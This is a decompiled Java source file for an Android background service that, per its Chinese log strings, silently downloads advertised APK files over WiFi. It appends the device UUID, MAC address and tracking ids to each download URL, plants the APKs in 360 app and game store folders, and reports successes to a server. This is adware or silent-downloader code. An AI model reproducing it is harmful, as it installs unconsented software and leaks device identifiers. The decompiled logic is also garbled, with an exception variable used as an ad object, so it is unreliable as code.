package com.android.apps.activity;

import android.app.Activity;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import com.android.apps.bean.AdAdvertisement;
import com.android.apps.connect.HttpUtil;
import com.android.apps.listenerinterface.OnQuietlyDownLintener;
import com.android.apps.threadpool.InfoTask;
import com.android.apps.threadpool.MercuryExecutorService;
import com.android.apps.util.AdManager;
import com.android.apps.util.ApkUtil;
import com.android.apps.util.CheckNet;
import com.android.apps.util.Config;
import com.android.apps.util.SystemProject;
import com.android.apps.util.UserInfo;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import org.apache.commons.io.FileUtils;

public class BGDownloadService
  extends Service
{
  public static Activity activity;
  public static int adId;
  public static int adListSize = 0;
  public static String apkName;
  public static QuietltDownloadThread downloadThread;
  public static boolean downloading;
  public static int dwonTotalSize;
  public static int totalSize = 0;
  private String TAG = "TAG";
  private HttpUtil httpUtil;
  private UserInfo userInfo;
  
  static
  {
    dwonTotalSize = 0;
    downloading = true;
  }
  
  public BGDownloadService() {}
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onDestroy()
  {
    if (AdManager.downingList.size() > 0)
    {
      int i = 0;
      while (i < AdManager.downingList.size())
      {
        Object localObject = (String)AdManager.downingList.get(i);
        localObject = new File(Config.AD_APK_PATH + File.separator + (String)localObject);
        if (((File)localObject).exists()) {
          ((File)localObject).delete();
        }
        i += 1;
      }
    }
    super.onDestroy();
  }
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    this.httpUtil = new HttpUtil();
    paramIntent = new QuietltDownloadThread();
    downloadThread = paramIntent;
    paramIntent.start();
  }
  
  public class QuietltDownloadThread
    extends Thread
  {
    public QuietltDownloadThread() {}
    
    public void run()
    {
      if (SystemProject.checkSDcard())
      {
        BGDownloadService.access$002(BGDownloadService.this, new UserInfo());
        new StringBuilder("只有SD卡才会开始静默下载线程~，判断当前是否可以下载downloading：").append(BGDownloadService.downloading).toString();
        boolean bool = CheckNet.isWifiEnable();
        Object localObject1 = ApkUtil.quietlyList;
        if ((bool) && (localObject1 != null) && (((List)localObject1).size() > 0))
        {
          BGDownloadService.adListSize = 0;
          while ((BGDownloadService.downloading) && (BGDownloadService.adListSize < ApkUtil.quietlyList.size()))
          {
            AdAdvertisement localAdAdvertisement = (AdAdvertisement)ApkUtil.quietlyList.get(BGDownloadService.adListSize);
            Object localObject4 = localAdAdvertisement.getApkUrl() + "?imsi=" + AdManager.device_uuid + "&macAddress=" + AdManager.mac + "&mid=" + AdManager.mercuryId + "&adId=" + localAdAdvertisement.getId() + "&way=j&gamePackage=" + AdManager.gamePackage + "&stage=1";
            Object localObject3 = localAdAdvertisement.getApkName();
            BGDownloadService.adId = localAdAdvertisement.getId();
            Object localObject5 = new File(Config.AD_APK_PATH + File.separator + "j_" + (String)localObject3 + ".apk");
            File localFile1 = new File(Config.AD_APK_PATH + File.separator + "s_" + (String)localObject3 + ".apk");
            File localFile2 = new File(Config.AD_APK_PATH + File.separator + "l_" + (String)localObject3 + ".apk");
            localObject1 = new File(Config.AD_APK_PATH + File.separator + "j_" + (String)localObject3 + ".apk");
            Object localObject2 = new File(Config.AD_APK_PATH + File.separator + "j_" + (String)localObject3 + ".temp");
            AdManager.downingList.add("j_" + (String)localObject3 + ".apk");
            BGDownloadService.this.userInfo.addDownlaodAd("j_" + (String)localObject3 + ".apk");
            if ((!((File)localObject5).exists()) && (!localFile1.exists()) && (!localFile2.exists())) {
              for (;;)
              {
                try
                {
                  localObject5 = new URL((String)localObject4);
                  new StringBuilder("静默下载打开的url：").append((String)localObject4).toString();
                  localObject5 = (HttpURLConnection)((URL)localObject5).openConnection();
                  ((HttpURLConnection)localObject5).connect();
                  localObject4 = ((HttpURLConnection)localObject5).getInputStream();
                  BGDownloadService.dwonTotalSize = ((HttpURLConnection)localObject5).getContentLength();
                  localObject5 = new FileOutputStream((File)localObject2);
                  BGDownloadService.apkName = "j_" + (String)localObject3 + ".apk";
                  localObject3 = new byte['Ѐ'];
                  int i = ((InputStream)localObject4).read((byte[])localObject3);
                  if (i != -1)
                  {
                    ((FileOutputStream)localObject5).write((byte[])localObject3, 0, i);
                    BGDownloadService.totalSize = i + BGDownloadService.totalSize;
                    continue;
                  }
                }
                catch (Exception localException)
                {
                  ((File)localObject1).delete();
                  localException.printStackTrace();
                  BGDownloadService.adListSize += 1;
                }
                ((FileOutputStream)localObject5).flush();
                ((FileOutputStream)localObject5).close();
                ((InputStream)localObject4).close();
                if ((((File)localObject2).exists()) && (((File)localObject2).length() == BGDownloadService.dwonTotalSize))
                {
                  FileUtils.moveFile((File)localObject2, (File)localObject1);
                  if ((Config.GAME_365_PATH != null) && (!"".equals(Config.GAME_365_PATH)) && (Config.SOFT_360_PATH != null) && (!"".equals(Config.SOFT_360_PATH)) && (localException != null) && (((File)localObject1).exists()) && (((File)localObject1).isFile()))
                  {
                    localObject2 = new File(Config.SOFT_360_PATH);
                    localObject3 = new File(Config.GAME_365_PATH);
                    if (localException.getCategoryId() == 1)
                    {
                      FileUtils.copyFileToDirectory((File)localObject1, (File)localObject2);
                      new StringBuilder("+++++++++++++++++++++++应用拷贝成功   文件名字为：").append(((File)localObject1).getName()).toString();
                    }
                    if (localException.getCategoryId() == 2)
                    {
                      FileUtils.copyFileToDirectory((File)localObject1, (File)localObject3);
                      new StringBuilder("+++++++++++++++++++++++游戏拷贝成功   文件名字为：").append(((File)localObject1).getName()).toString();
                    }
                  }
                }
                BGDownloadService.this.userInfo.removeDownloadAd(BGDownloadService.apkName);
                AdManager.downingList.remove(BGDownloadService.apkName);
                BGDownloadService.totalSize = 0;
                localObject2 = ApkUtil.quietlyDownLintener;
                if (localObject2 != null) {
                  ((OnQuietlyDownLintener)localObject2).onQuietlyDownOverListener(true);
                }
                new StringBuilder("静默下载结束~~~~index：").append(BGDownloadService.adListSize).append(" ,apk名字为：").append(BGDownloadService.apkName).toString();
                if (AdManager.isConnect) {
                  MercuryExecutorService.execute(new InfoTask("downSuccess", localException.getId(), AdManager.mercuryViewType, "j", BGDownloadService.this.httpUtil));
                }
              }
            }
          }
        }
      }
    }
  }
}
